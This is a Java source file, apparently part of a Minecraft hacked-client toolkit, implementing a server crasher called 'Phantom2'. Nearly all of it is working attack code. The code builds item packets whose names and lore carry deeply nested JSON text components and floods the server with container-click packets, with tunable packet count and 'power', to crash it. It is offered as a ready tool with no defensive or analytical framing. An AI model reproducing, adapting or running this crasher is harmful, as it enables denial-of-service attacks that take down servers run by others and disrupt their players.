package us.whitedev.crashers.impl;

import it.unimi.dsi.fastutil.ints.Int2ObjectMap;
import it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap;
import java.util.List;
import java.util.Locale;
import java.util.Optional;
import net.minecraft.nbt.CompoundTag;
import net.minecraft.nbt.ListTag;
import net.minecraft.nbt.StringTag;
import net.minecraft.network.protocol.Packet;
import net.minecraft.network.protocol.game.ServerGamePacketListener;
import net.minecraft.network.protocol.game.ServerboundContainerClickPacket;
import net.minecraft.world.inventory.ClickType;
import net.minecraft.world.item.ItemStack;
import net.minecraft.world.item.Items;
import us.whitedev.crashers.Crasher;
import us.whitedev.helpers.PacketHelper;
import us.whitedev.utils.OptionType;
import us.whitedev.utils.OptionUtil;

public class Phantom2 implements Crasher {
    private static final String METHOD_NAME = "Phantom2";
    private boolean enabled = false;

    public Phantom2() {
    }

    public void onMethod(String[] args) {
        int packets = Integer.parseInt(args[2]);
        int power = Integer.parseInt(args[3]);
        String type = args[4].toLowerCase(Locale.ROOT);
        this.setEnabled(true);
        msgHelper.sendMessage("Starting crashing with &f" + this.getName(), true);
        Packet<ServerGamePacketListener> packet = this.getPacketAbuser(type, power);
        if (packet != null) {
            for(int i = 0; i < packets; ++i) {
                PacketHelper.send(packet);
            }
        } else {
            msgHelper.sendMessage("&cInvalid &7\"type\" argument!", true);
        }

        this.setEnabled(false);
        msgHelper.sendMessage("Attack &asuccessful &7finished!", true);
    }

    private Packet<ServerGamePacketListener> getPacketAbuser(String type, int power) {
        CompoundTag comp = new CompoundTag();
        ListTag lore = new ListTag();
        String var10000 = "\"extra\":[{".repeat(power);
        String dotExtra = "{" + var10000 + "\"text\":\".\"}],".repeat(power) + "\"text\":\".\"}";
        var10000 = "\"extra\":[{".repeat(power);
        String keyBindExtra = "{" + var10000 + "\"keybind\":\"\"}],".repeat(power) + "\"keybind\":\"\"}";
        CompoundTag display = new CompoundTag();
        Int2ObjectMap<ItemStack> itemMap = new Int2ObjectOpenHashMap();
        switch (type) {
            case "default":
                StringTag loreLine = new StringTag(keyBindExtra);

                for(int i = 0; i < 1; ++i) {
                    lore.add(loreLine);
                }

                display.put("Name", new StringTag(keyBindExtra));
                display.put("Lore", lore);
                comp.put("display", display);
                ItemStack itemStack = new ItemStack(Items.APPLE, 1, Optional.of(comp));
                return new ServerboundContainerClickPacket(0, 0, 0, 0, ClickType.PICKUP, itemStack, itemMap);
            case "boost":
                StringTag loreLine = new StringTag(dotExtra);

                for(int i = 0; i < 4; ++i) {
                    lore.add(loreLine);
                }

                display.put("Name", new StringTag(dotExtra));
                display.put("Lore", lore);
                comp.put("display", display);
                ItemStack itemStack = new ItemStack(Items.CHERRY_CHEST_BOAT, 1, Optional.of(comp));

                for(int i = 0; i < 10; ++i) {
                    itemMap.put(i, itemStack);
                }

                return new ServerboundContainerClickPacket(0, 0, 1, 1, ClickType.PICKUP, itemStack, itemMap);
            default:
                return null;
        }
    }

    public String getName() {
        return "Phantom2";
    }

    public boolean getEnabled() {
        return this.enabled;
    }

    public void setEnabled(boolean bool) {
        this.enabled = bool;
    }

    public List<OptionUtil> getOptions() {
        return List.of(new OptionUtil("Packets", OptionType.INTEGER), new OptionUtil("Power", OptionType.INTEGER), new OptionUtil("Type", OptionType.LIST, new String[]{"Default", "Boost"}));
    }

    public String getArgsUsage() {
        return "packets[100], power[10], type[default]";
    }

    public String getDescription() {
        return "Invisible Netty Server Crasher";
    }
}
